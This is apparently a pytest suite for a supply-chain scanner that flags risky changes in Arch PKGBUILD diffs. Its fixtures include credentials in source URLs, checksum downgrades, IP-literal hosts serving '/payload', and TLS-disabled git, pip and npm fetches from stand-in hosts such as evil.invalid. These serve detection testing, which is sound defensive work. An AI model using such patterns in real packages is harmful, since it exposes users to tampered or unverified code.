"""Addendum 4: coverage gaps fillable with existing machinery."""

from trustsight.analysis.pipeline import scan_diff


def _diff(body: str, files: str = "PKGBUILD") -> str:
    added = "".join(f"+{line}\n" for line in body.splitlines())
    count = 2 + len(body.splitlines())
    return (
        f"--- a/{files}\n+++ b/{files}\n@@ -1,2 +1,{count} @@\n"
        " pkgname=demo\n pkgver=1.0\n" + added
    )


def _ids(text: str) -> set[str]:
    fact = scan_diff(text, package_name="demo")
    return {entry.rule_id for entry in fact.score_breakdown}


def _findings(text: str):
    fact = scan_diff(text, package_name="demo")
    return {entry.rule_id: entry for entry in fact.score_breakdown}


def test_g1_credentials_in_a_source_url_fire_and_redact():
    findings = _findings(_diff(
        "source=('https://user:pass@example.com/x.tar.gz')\n"
    ))
    assert "C020" in findings
    entry = findings["C020"]
    assert "example.com" in entry.reason
    assert "user:pass" not in entry.reason


def test_g4_weak_checksum_downgrade_fires():
    text = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,4 @@\n"
        " pkgname=demo\n pkgver=1.0\n"
        "-sha256sums=('aaaa')\n"
        " md5sums=('bbbb')\n"
        "-pkgrel=1\n+depends=('glibc')\n"
    )
    assert "C022" in _ids(text)


def test_g4_removing_every_array_is_h002_not_c022():
    text = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,3 @@\n"
        " pkgname=demo\n pkgver=1.0\n"
        "-sha256sums=('aaaa')\n"
        "+depends=('glibc')\n"
    )
    assert "C022" not in _ids(text)


def test_g5_ip_literal_gained_host_fires():
    assert "C023" in _ids(_diff(
        "source=('https://203.0.113.7/payload')\n"
    ))
    assert "C023" in _ids(_diff(
        "source=('https://[2001:db8::1]/payload')\n"
    ))


def test_g3_dependency_removal_during_a_build_change_fires():
    text = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,5 @@\n"
        " pkgname=demo\n pkgver=1.0\n"
        "-checkdepends=('pytest')\n"
        "+checkdepends=()\n"
        " build() {\n"
        "-  make check\n"
        "+  make\n"
        " }\n"
    )
    assert "C021" in _ids(text)


def test_g3_removal_without_a_build_change_stands_down():
    text = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
        " pkgname=demo\n pkgver=1.0\n"
        "-checkdepends=('pytest')\n"
        "+checkdepends=()\n"
    )
    assert "C021" not in _ids(text)


def test_g6_undeclared_install_script_fires():
    text = (
        "--- a/demo.install\n+++ b/demo.install\n@@ -1,3 +1,3 @@\n"
        " post_install() {\n"
        "-  echo old\n"
        "+  echo new\n"
        " }\n"
    )
    assert "C024" in _ids(text)


def test_g7_hardening_option_gained_fires():
    text = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
        " pkgname=demo\n pkgver=1.0\n"
        "-options=('strip')\n"
        "+options=('!strip' '!debug')\n"
    )
    assert "C025" in _ids(text)


def test_g2_tls_disable_is_caught_for_other_clients():
    from trustsight.rules import apply_rules

    for line in (
        "git -c http.sslVerify=false clone https://evil.invalid/x",
        "pip install --trusted-host pypi.invalid pkg",
        "npm install --strict-ssl=false pkg",
    ):
        triggered = apply_rules([line], [line], None)
        assert any(rule["rule_id"] == "R057" for rule in triggered), line


def _addendum4_ids(diff_text, tree_manifest):
    from trustsight.analysis.structural import addendum4_findings
    from trustsight.diffdoc import parse_diff
    from trustsight.recipedoc import recipe_states

    doc = parse_diff(diff_text)
    pre, post = recipe_states(doc)
    out = []

    def add(rule_id, name, severity, category, match,
            file="PKGBUILD", line=None, **extra):
        out.append(rule_id)

    class _SC:
        added_urls = ()

    addendum4_findings(diff_text, doc, pre, post, _SC(), {}, add,
                       tree_manifest=tree_manifest)
    return out


_DANGLING = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
    " pkgname=demo\n pkgver=1.0\n+install=demo.install\n"
)


def test_g6a_dangling_install_declaration_fires_with_tree_knowledge():
    assert "C027" in _addendum4_ids(_DANGLING, [("PKGBUILD", b"")])


def test_g6a_a_present_install_file_does_not_fire():
    assert "C027" not in _addendum4_ids(_DANGLING, [("demo.install", b"")])


def test_g6a_never_guesses_without_tree_knowledge():
    assert "C027" not in _addendum4_ids(_DANGLING, None)


def test_g1_url_without_userinfo_does_not_fire():
    assert "C020" not in _ids(_diff(
        "source=('https://example.invalid/x.tar.gz')\n"))


def test_g2_benign_tls_enabled_clients_do_not_fire():
    from trustsight.rules import apply_rules

    for line in (
        "git clone https://example.invalid/x",
        "pip install somepkg",
        "npm install somepkg",
    ):
        triggered = apply_rules([line], [line], None)
        assert not any(r["rule_id"] == "R057" for r in triggered), line


def test_g4_rotation_with_a_stronger_array_kept_does_not_fire():
    text = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
        " pkgname=demo\n pkgver=1.1\n"
        "-sha256sums=('aaaa')\n"
        "+sha256sums=('bbbb')\n"
        " md5sums=('cccc')\n"
    )
    assert "C022" not in _ids(text)


def test_g5_context_line_ip_source_does_not_fire():
    # The IP source is a context line, not a gained one.
    text = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
        " pkgname=demo\n"
        " source=('https://203.0.113.7/payload')\n"
        "-pkgver=1.0\n+pkgver=1.1\n"
    )
    assert "C023" not in _ids(text)
